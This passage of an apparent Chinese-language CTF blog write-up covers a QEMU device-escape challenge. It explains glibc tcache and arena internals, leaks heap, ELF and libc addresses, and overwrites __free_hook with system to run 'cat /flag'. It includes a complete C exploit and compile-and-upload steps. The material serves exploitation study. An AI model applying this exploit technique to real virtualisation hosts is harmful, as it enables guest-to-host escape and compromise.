+<p>尝试发现不可行，导致不可行的因素有二：</p>
+<ol>
+<li><code>qemu</code>自带的多线程情景。</li>
+<li>绕不过<code>nextchunk &lt; topchunk+size(topchunk)</code>的检测。</li>
+</ol>
+<p>在调用<code>vin_mmio_read/write</code>处理设备的时候断下来，我们可以发现程序开启了四个<code>thread</code>，而我们处理设备时必定处于第三个<code>thread</code>。</p>
+<p><img src="https://i.loli.net/2020/07/13/6MSwdYk5acQn9xt.png" alt="image-20200713113436356.png"></p>
+<p>由于<code>tcache</code>指针在<code>MAYBE_INIT_TCACHE</code>函数中被初始化，其会自动找到可用<code>arena</code>的<code>tcache</code>，当前<code>thread</code>的<code>arena</code>若可用肯定就初始化为本线程的<code>arena</code>的<code>tcache</code>，所以我们<code>free</code>的<code>fake_chunk</code>必定会先放到当前<code>thread</code>对应<code>size</code>的<code>tcache</code>中，若已经满了，才会再根据<code>size</code>是否小于<code>global_max_fast</code>判断，是则放入<code>arena_ptr</code>的<code>fastbin</code>中，（否的话就会报错，是没法放入<code>unsortedbin</code>的，这点之后会细说），这个<code>arena_ptr</code>是根据进入<code>_int_free</code>前的<code>arena_for_chunk</code>获取来的，其是根据<code>chunk</code>的<code>N</code>标志位判定的，为<code>1</code>代表属于<code>thread_arena</code>，为<code>0</code>代表属于<code>main_arena</code>。</p>
+<p><img src="https://i.loli.net/2020/07/13/FYKGu6tbxJSicOh.png" alt="image-20200713113729091.png"></p>
+<p><img src="https://i.loli.net/2020/07/13/I4zKU18GCYVHjal.png" alt="image-20200713114008087.png"></p>
+<p><code>N</code>为0时，是可以将<code>fake_chunk</code>放入<code>main_arena</code>的<code>fastbin</code>中的，但是当我伪造<code>N</code>为<code>1</code>时，想将<code>chunk</code>放入<code>thread</code>的<code>fastbin</code>时，发现必定会报错，跟进<code>arena_for_chunk</code>，发现程序看到<code>N</code>为1时，会判定这个<code>chunk</code>是属于一个<code>thread_arena</code>的，然后其会去寻找这个<code>thread</code>的<code>malloc_state</code>，也就是<code>arena_ptr</code>，然后这个寻找的方法竟然是直接将<code>chunk_addr &amp; 0xfffffffffc000000</code>作为<code>thread</code>的一个<code>heap_info</code>，然后从<code>[chunk_addr &amp; 0xfffffffffc000000]</code>里取出值作为<code>malloc_state</code>的地址（因为正常<code>thread</code>的所有<code>heap_info</code>的第一个数据位装的都是<code>malloc_state</code>地址）。但是我们的<code>fake_chunk</code>与<code>0xfffffffffc000000</code>按位与后地址肯定是个不合法地址，所以之后必定会有访存错误。</p>
+<p><img src="https://i.loli.net/2020/07/13/l2LoagOFTpXVsU1.png" alt="image-20200713114852714.png"></p>
+<p><img src="https://i.loli.net/2020/07/13/iPD3bRc8Xrelz5S.png" alt="image-20200713115101526.png"></p>
+<p><img src="http://pwn4.fun/images/glibcmalloc/threadarena.png" alt=""></p>
+<p><strong>所以我们没办法把<code>chunk</code>放入<code>thread_arena</code>的<code>fastbin</code>中，只能放进<code>thread_arena</code>的<code>tcache</code>中或者<code>main_arena</code>的<code>fastbin</code>中。</strong></p>
+<p>但是为什么没办法放入<code>main_arena</code>的<code>unsortedbin</code>中呢？对照着<code>free</code>的报错信息<code>double free or corruption (out)</code>找到对应的检测：发现在将<code>chunk</code>放入<code>fastbin</code>和<code>unsortedbin</code>之间会有一系列的轻量级检测，其中有一个是检测<code>nextchunk &gt;= av-&gt;topchunk + chunksize(av-&gt;top)</code>，我们的<code>fakechunk</code>是在<code>mmap64</code>地址上的，这个地址虽然是随机的，但是必定在<code>ld.so</code>的加载位置之后，所以其地址必定是大于<code>main_arena</code>的<code>topchunk+size(topchunk)</code>的地址的，所以如果放不进<code>fastbin</code>，走到这里必定会挂掉，这就是没法放进<code>unsortedbin</code>的原因所在。</p>
+<p><img src="https://i.loli.net/2020/07/13/zNkTBdOA8QxPZFK.png" alt="image-20200713121403108.png"></p>
+<p>所以想直接把<code>chunk</code>放入<code>unsortedbin</code>的尝试失败了。</p>
+<h5 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h5><p>直接放不行，那么尝试间接放入，先放入<code>main_arena</code>的<code>fastbin</code>中，然后想办法触发<code>main_arena</code>的<code>malloc_consolidate</code>，使其将<code>fastbin</code>中的<code>chunk</code>整理进<code>smallbin</code>中再进行<code>leak</code>出来。</p>
+<p>查阅资料得知，在<code>__libc_malloc</code>的<code>arena_get</code>函数理论上是可能返回<code>main_arena</code>指针的，但是我写了个<code>for</code>循环，连续1000次<code>malloc(0x500)</code>，尝试了很久，都没办法触发到。。。可能原因是当前线程的<code>arena</code>是处于可用状态的，所以就直接返回当前线程的<code>arena</code>了，只有在本线程被<code>lock</code>了，才有可能返回其他的<code>arena</code>？？具体原因我也不是很清楚，写多线程竞争<code>malloc</code>是否可行？？感觉不是很靠谱。。我自己是失败了。</p>
+<p><img src="https://i.loli.net/2020/07/13/KtYusjR6kQi24b8.png" alt="image-20200713160102889.png"></p>
+<p>想把<code>fakechunk</code>间接放入<code>unsortedbin</code>也失败了。</p>
+<h5 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h5><p>既然泄露<code>libc</code>失败了，那就看看没有<code>libc</code>能不能利用呢，观察发现有一块<code>rwx</code>的区域，且和我们的<code>thread_heap</code>的距离有可能间隔固定为<code>0x6000000</code>，（这张图我截的是关了<code>alsr</code>的，是固定为<code>0x6000000</code>，开了以后会变，但仍然有概率是<code>0x6000000</code>，大概五六次可以撞见一次？反正是有的）。</p>
+<p><img src="https://i.loli.net/2020/07/13/AZtVCQmy1GjgepK.png" alt="image-20200713161131160.png"></p>
+<p>首先是如何泄露<code>thread_heap</code>基址，因为程序比较复杂和多线程的原因，堆极度混乱，我顺手截了几张图：</p>
+<p><img src="https://i.loli.net/2020/07/13/QImxo9kvewC8nMl.png" alt="image-20200713161837450.png"></p>
+<p><img src="https://i.loli.net/2020/07/13/mai51K6p8df7HCn.png" alt="image-20200713161846125.png"></p>
+<p><img src="https://i.loli.net/2020/07/13/bFnuiYPIgWe5H89.png" alt="image-20200713161856005.png"></p>
+<p>几乎每次的各种链里的<code>chunk</code>都不同，所以没办法用<code>UAF</code>泄露出一个稳定的<code>chunk</code>地址，但是因为有前面<code>free</code>里面寻找<code>malloc_state</code>方法的提示，可以想到我们只需要<code>malloc_state</code>的地址，不需要关注具体某一个<code>chunk</code>的地址，所以泄露出任意一个<code>chunk</code>地址，然后与<code>0xffffff000000</code>按位与即可获得当前线程<code>malloc_state</code>的起始地址。</p>
+<p>然后我们加上<code>0x6000000</code>就有概率获取<code>rwx</code>页的地址，然后用一次任意地址分配+写的机会去往里面填充<code>shellcode</code>，但是后续我想不到如何将程序劫持到<code>shellcode</code>上去。。。</p>
+<p>注：此块<code>rwx</code>页的申请并非故意留的后门，为<code>tcg/translate-all.c</code>设备申请出来作为<code>dynamic translator buffer</code>用的：</p>
+<p><img src="https://i.loli.net/2020/07/13/CGpPoySjXrA2T1L.png" alt="image-20200713162737910.png"></p>
+<p><img src="https://i.loli.net/2020/07/13/Z6GBQJj29UDyMgf.png" alt="image-20200713162907438.png"></p>
+<h5 id="思路四"><a href="#思路四" class="headerlink" title="思路四"></a>思路四</h5><p>说是只有一次机会任意地址分配+写，但实际上是只有一次任意地址分配的机会，然后有无限次向其中写的机会，所以可以想到能否先用这一次任意地址分配去分配到设备结构体，然后不断用写去将<code>0x1AC0</code>赋值为<code>1</code>，进而突破限制造成无限次任意地址分配，然后配合思路三去做。</p>
+<p>要是设备结构体是分配在线程堆上的话，此方法应该是可行的，然而调试发现其位于<code>main_arena</code>上，啊这。</p>
+<h5 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h5><p>到这里已经过去一天的时间了。。。第二天起来还是没有啥思路，整理了一下思绪和现在可以做到的事情：</p>
+<p>我们只能泄露出<code>mmap64</code>的地址和<code>thread_arena</code>的地址。</p>
+<p>因为只有<code>thread_arena</code>的地址是现阶段可以得到的，所以我抱着试一试的态度去看了下<code>thread_arena</code>中的数据，没想到有意外收获：</p>
+<p><img src="https://i.loli.net/2020/07/13/i4GlrhJSy3NIzmd.png" alt="image-20200713161405925.png"></p>
+<p>在<code>thread_heap</code>固定偏移的地方存有稳定的<code>elfbase</code>地址，而且有很多个。。。说实话我不知道这些数据是做什么的，但是线程的<code>malloc_state</code>和<code>heap_info</code>中是不存在这种数据的：</p>
+<p><code>malloc_state</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><code>heap_info</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>
+<p>查看<code>malloc_state</code>结构体中内容：</p>
+<p><img src="https://md.byr.moe/uploads/upload_77004e83b1dd6a6a5f4bbe879f23244c.png" alt=""></p>
+<p><img src="https://md.byr.moe/uploads/upload_751a1b025b19fbcba9d3dee371d0ef6c.png" alt=""></p>
+<p>发现从偏移<code>0x8c0</code>处<code>malloc_state</code>就已经结束，，接着是一个<code>0x255</code>的<code>chunk</code>，其是负责管理<code>tcache</code>的结构体：</p>
+<p><img src="https://md.byr.moe/uploads/upload_c94f234084fbda656c9ea68c28858144.png" alt=""></p>
+<p>然后到偏移<code>0xB10</code>处，<code>tcache</code>管理结构体结束，又是一个<code>0x98c5</code>的超大<code>chunk</code>，而那些<code>elfbase</code>就是存在于这个<code>chunk</code>中，但是我不知道他是用来做什么的以及那些<code>elf</code>的地址的意义代表什么：</p>
+<p><img src="https://md.byr.moe/uploads/upload_588d910ca2f1178877a8db345024b40e.png" alt=""></p>
+<p>发现了存在<code>elfbase</code>之后，就可以想办法将其泄露出来。</p>
+<p>我们可以先确定一个程序使用率较低的<code>size</code>的<code>tcache</code>链来进行后续攻击，我这里选的是<code>0x400</code>这条链。先泄露出<code>thread_heap</code>的基址，然后<code>free</code>一个<code>size</code>为<code>0x400</code>的<code>fake_chunk</code>进入对应的<code>tcache</code>，然后用<code>case 2</code>去将这个<code>fake_chunk</code>的<code>fd</code>改为带有<code>elfbase</code>地址的<code>thread_heap</code>地址，我选的偏移是<code>0xBA0</code>。</p>
+<p>形成如下结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x400)   tcache_entry[62](2): fake_chunk --&gt; thread_heap_start + 0xba0 --&gt; elfbase + offset --&gt; xxxxxxxx</span><br></pre></td></tr></table></figure>
+<p>然后调用两次<code>case 8</code>，一次<code>case 1</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x400)   tcache_entry[62](1): fake_chunk --&gt; elfbase + offset --&gt; xxxxxxxx</span><br></pre></td></tr></table></figure>
+<p><strong>但是要注意一点，我们需要在进行<code>leak elfbase</code>之前要先布置好<code>tcache-&gt;counts[62]</code>，因为我们<code>malloc</code>的次数比<code>free</code>的次数要多，所以假如开始时<code>count</code>为1的话，那么在两次<code>malloc</code>之后会变为<code>255</code>，也就是<code>-1</code>，这时在那一次<code>case 1</code>的<code>free</code>中程序检测<code>tcache</code>已满，所以会去尝试放入<code>unsortedbin</code>中，导致报错，所以在最开始要先<code>free</code>两次<code>fake_chunk</code>将<code>tcache-&gt;counts[62]</code>调整为2。</strong></p>
+<p>然后用<code>mmap64</code>的任意读读出<code>elfbase</code>地址。</p>
+<p>有了<code>elfbase</code>之后，我们就可以用<code>GOT</code>表泄露<code>libcbase</code>，方法同上，注意点同上，要先将<code>tcache-&gt;counts[62]</code>调整为2。</p>
+<h4 id="hijack"><a href="#hijack" class="headerlink" title="hijack"></a>hijack</h4><p>有了<code>libcbase</code>之后，用一次任意地址分配+写去改<code>free_hook</code>为<code>system</code>，然后在<code>mmap64</code>处布置好<code>cat /flag</code>字符串，调用<code>case 1</code>触发<code>free(&quot;cat /flag&quot;)</code>即可。</p>
+<p><img src="https://md.byr.moe/uploads/upload_6bcd2e5d69db75f6637d307e45a3b99b.png" alt=""></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>加<code>getchar</code>是为了在调试时使<code>gdb</code>的信号接收不错位，比如你<code>exp</code>里先调用了<code>mmio_write</code>，后调用了<code>mmio_read</code>，然后在<code>mmio_read</code>和<code>mmio_write</code>的地址都下了断点，按<code>c</code>，会发现有时是先断在<code>mmio_read</code>的，可能是读的信号来的更快？？总之加了<code>getchar</code>就不会错位，<code>sleep(0.1)</code>应该也可以起到相同效果。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr</span><span class="params">(<span class="keyword">char</span> buf[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>,O_RDWR|O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        perr(<span class="string">"[:(]mmio_fd open failed..."</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x100000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        perr(<span class="string">"[:(]mmap mmio_mem failed..."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]mmio_mem = %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    mmio_write(<span class="number">0x030008</span>,<span class="number">0x400</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x010010</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x010010</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x010010</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">	mmio_write(<span class="number">0x030408</span>,<span class="number">0x290</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x010410</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">uint64_t</span> thread_heap = mmio_read(<span class="number">0x060410</span>);</span><br><span class="line">    thread_heap &amp;= <span class="number">0xffffff000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]thread_heap = %p\n"</span>,thread_heap);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030010</span>,thread_heap + <span class="number">0xba0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030014</span>,thread_heap &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    *((<span class="keyword">uint8_t</span>*)(mmio_mem + <span class="number">0x08007E</span>)) = <span class="number">0</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    *((<span class="keyword">uint8_t</span>*)(mmio_mem + <span class="number">0x08007E</span>)) = <span class="number">0</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x010010</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">uint64_t</span> codebase = mmio_read(<span class="number">0x060010</span>)-(<span class="number">0x5555567ae468</span><span class="number">-0x555555554000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]codebase = %p\n"</span>,codebase);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> free_got = <span class="number">0x1092330</span> + codebase;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x010010</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030010</span>,free_got);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030014</span>,free_got &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    *((<span class="keyword">uint8_t</span>*)(mmio_mem + <span class="number">0x08007E</span>)) = <span class="number">0</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    *((<span class="keyword">uint8_t</span>*)(mmio_mem + <span class="number">0x08007E</span>)) = <span class="number">0</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x010010</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">uint64_t</span> libcbase = mmio_read(<span class="number">0x060010</span>)<span class="number">-0x97950</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]libcbase = %p\n"</span>,libcbase);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> free_hook = libcbase + (<span class="number">0x7ffff41528e8</span><span class="number">-0x00007ffff3d65000</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = libcbase + (<span class="number">0x7ffff3db4440</span><span class="number">-0x00007ffff3d65000</span>);</span><br><span class="line">    </span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030010</span>,free_hook);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030014</span>,free_hook &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    *((<span class="keyword">uint8_t</span>*)(mmio_mem + <span class="number">0x08007E</span>)) = <span class="number">0</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    *((<span class="keyword">uint8_t</span>*)(mmio_mem + <span class="number">0x04007E</span>)) = <span class="number">0</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(mmio_mem + <span class="number">0x070000</span>)) = system_addr;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030010</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030014</span>,<span class="number">0x616c662f</span>); </span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x030018</span>,<span class="number">0x067</span>); </span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x010010</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0x00007ffff3d65000 0x00007ffff3f4c000 r-xp      /lib/x86_64-linux-gnu/libc-2.27.so</span></span><br><span class="line"><span class="comment">0x00007ffff3f4c000 0x00007ffff414c000 ---p      /lib/x86_64-linux-gnu/libc-2.27.so</span></span><br><span class="line"><span class="comment">0x00007ffff414c000 0x00007ffff4150000 r--p      /lib/x86_64-linux-gnu/libc-2.27.so</span></span><br><span class="line"><span class="comment">0x00007ffff4150000 0x00007ffff4152000 rw-p      /lib/x86_64-linux-gnu/libc-2.27.so</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gdb-peda$ p &amp;__free_hook</span></span><br><span class="line"><span class="comment">$1 = (void (**)(void *, const void *)) 0x7ffff41528e8 &lt;__free_hook&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gdb-peda$ p &amp;system     </span></span><br><span class="line"><span class="comment">$2 = (int (*)(const char *)) 0x7ffff3db4440 &lt;__libc_system&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><p>打远程需要上传写好的<code>exp</code>，一般流程是先用<code>musl-gcc</code>编译，然后<code>strip</code>，然后再传：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc myexp.c -Os -o myexp</span><br><span class="line">strip myexp</span><br><span class="line">python upload.py</span><br></pre></td></tr></table></figure>
+<p><code>upload.py</code>：</p>
